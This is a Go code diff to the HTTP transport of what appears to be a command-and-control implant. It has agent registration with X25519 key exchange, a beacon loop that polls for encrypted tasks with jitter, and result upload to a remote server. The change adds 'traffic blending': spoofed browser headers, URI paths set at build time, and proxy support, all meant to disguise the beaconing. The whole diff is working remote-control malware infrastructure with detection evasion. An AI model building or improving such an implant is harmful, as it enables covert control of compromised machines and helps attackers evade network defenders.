@@ -17,40 +17,78 @@ import (
 //
 // Session lifecycle per reconnect cycle:
 //
-//  1. Connect — POST {baseURL}/register
+//  1. Connect — POST {baseURL}{registerPath}
 //     Request:  [32-byte agent ephemeral X25519 pubkey][JSON proto.Hello]
 //     Response: [32-byte server X25519 pubkey][encrypted proto.Welcome frame]
 //     Derives CryptoSession; stores beacon token from Welcome.Token.
 //
-//  2. PollTask — GET {baseURL}/beacon/{token}
+//  2. PollTask — GET {baseURL}{beaconPath}{token}
 //     200: encrypted proto.Task frame in body
 //     204: no task pending → sleep interval±jitter and retry
 //
-//  3. SendResult — POST {baseURL}/beacon/{token}
+//  3. SendResult — POST {baseURL}{beaconPath}{token}
 //     Body: encrypted proto.Result frame
+//
+// Traffic blending:
+//   - Requests carry a browser-like User-Agent (httpUA ldflags var).
+//   - Register and beacon URI paths are configurable at build time
+//     (httpRegisterPath / httpBeaconPath ldflags vars).
+//   - The http.Client uses http.ProxyFromEnvironment so HTTP_PROXY /
+//     HTTPS_PROXY / NO_PROXY environment variables are honoured.
 type HTTPTransport struct {
-	baseURL string
-	fp      string // pinned server fingerprint (may be "")
-	cs      *proto.CryptoSession
-	token   string
-	client  *http.Client
-	ivSec   int
-	jitPct  int
+	baseURL      string
+	fp           string // pinned server fingerprint (may be "")
+	registerURL  string // full URL for POST /register (built once in Connect)
+	beaconBase   string // base URL for GET|POST /beacon/{token}
+	cs           *proto.CryptoSession
+	token        string
+	client       *http.Client
+	userAgent    string
+	ivSec        int
+	jitPct       int
 }
 
 func newHTTPTransport(ivSec, jitPct int) *HTTPTransport {
 	return &HTTPTransport{
-		baseURL: fmt.Sprintf("http://%s:%s", lhost, lport),
-		fp:      serverFingerprint,
-		client:  &http.Client{Timeout: 30 * time.Second},
-		ivSec:   ivSec,
-		jitPct:  jitPct,
+		baseURL:   fmt.Sprintf("http://%s:%s", lhost, lport),
+		fp:        serverFingerprint,
+		userAgent: httpUA,
+		client: &http.Client{
+			Timeout: 30 * time.Second,
+			// Respect HTTP_PROXY / HTTPS_PROXY / NO_PROXY from the environment.
+			Transport: &http.Transport{
+				Proxy: http.ProxyFromEnvironment,
+			},
+		},
+		ivSec:  ivSec,
+		jitPct: jitPct,
 	}
 }
 
-// Connect registers with the server via POST /register.
+// newRequest builds an HTTP request with browser-like headers.
+func (t *HTTPTransport) newRequest(method, url string, body io.Reader) (*http.Request, error) {
+	req, err := http.NewRequest(method, url, body)
+	if err != nil {
+		return nil, err
+	}
+	req.Header.Set("User-Agent", t.userAgent)
+	req.Header.Set("Accept", "application/octet-stream, */*")
+	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
+	req.Header.Set("Cache-Control", "no-cache")
+	req.Header.Set("Pragma", "no-cache")
+	if body != nil {
+		req.Header.Set("Content-Type", "application/octet-stream")
+	}
+	return req, nil
+}
+
+// Connect registers with the server via POST {registerPath}.
 // A fresh ephemeral X25519 key is generated for each session.
 func (t *HTTPTransport) Connect(hello proto.Hello) error {
+	// Build URLs now so they're stable for the session lifetime.
+	t.registerURL = t.baseURL + httpRegisterPath
+	t.beaconBase = t.baseURL + httpBeaconPath
+
 	agentPriv, err := ecdh.X25519().GenerateKey(rand.Reader)
 	if err != nil {
 		return fmt.Errorf("keygen: %w", err)
@@ -63,7 +101,12 @@ func (t *HTTPTransport) Connect(hello proto.Hello) error {
 
 	// Body: [32-byte pubkey][JSON Hello]
 	body := append(agentPriv.PublicKey().Bytes(), helloJSON...)
-	resp, err := t.client.Post(t.baseURL+"/register", "application/octet-stream", bytes.NewReader(body))
+	req, err := t.newRequest(http.MethodPost, t.registerURL, bytes.NewReader(body))
+	if err != nil {
+		return fmt.Errorf("register request: %w", err)
+	}
+
+	resp, err := t.client.Do(req)
 	if err != nil {
 		return fmt.Errorf("register: %w", err)
 	}
@@ -105,7 +148,6 @@ func (t *HTTPTransport) Connect(hello proto.Hello) error {
 	}
 
 	t.token = welcome.Token
-	// Use server-suggested timing if provided.
 	if welcome.Interval > 0 {
 		t.ivSec = welcome.Interval
 	}
@@ -115,12 +157,17 @@ func (t *HTTPTransport) Connect(hello proto.Hello) error {
 	return nil
 }
 
-// PollTask polls GET /beacon/{token} until a task arrives.
+// PollTask polls GET {beaconPath}{token} until a task arrives.
 // 204 responses cause a jittered sleep before the next poll.
 func (t *HTTPTransport) PollTask() (*proto.Task, error) {
-	url := fmt.Sprintf("%s/beacon/%s", t.baseURL, t.token)
+	url := t.beaconBase + t.token
 	for {
-		resp, err := t.client.Get(url)
+		req, err := t.newRequest(http.MethodGet, url, nil)
+		if err != nil {
+			return nil, fmt.Errorf("poll request: %w", err)
+		}
+
+		resp, err := t.client.Do(req)
 		if err != nil {
 			return nil, fmt.Errorf("poll: %w", err)
 		}
@@ -157,17 +204,17 @@ func (t *HTTPTransport) PollTask() (*proto.Task, error) {
 	}
 }
 
-// SendResult POSTs an encrypted proto.Result to /beacon/{token}.
+// SendResult POSTs an encrypted proto.Result to {beaconPath}{token}.
 func (t *HTTPTransport) SendResult(result proto.Result) error {
 	var buf bytes.Buffer
 	if err := proto.WriteMsgEncrypted(&buf, t.cs, proto.MsgResult, result); err != nil {
 		return fmt.Errorf("result encrypt: %w", err)
 	}
-	resp, err := t.client.Post(
-		fmt.Sprintf("%s/beacon/%s", t.baseURL, t.token),
-		"application/octet-stream",
-		&buf,
-	)
+	req, err := t.newRequest(http.MethodPost, t.beaconBase+t.token, &buf)
+	if err != nil {
+		return fmt.Errorf("result request: %w", err)
+	}
+	resp, err := t.client.Do(req)
 	if err != nil {
 		return fmt.Errorf("result post: %w", err)
 	}
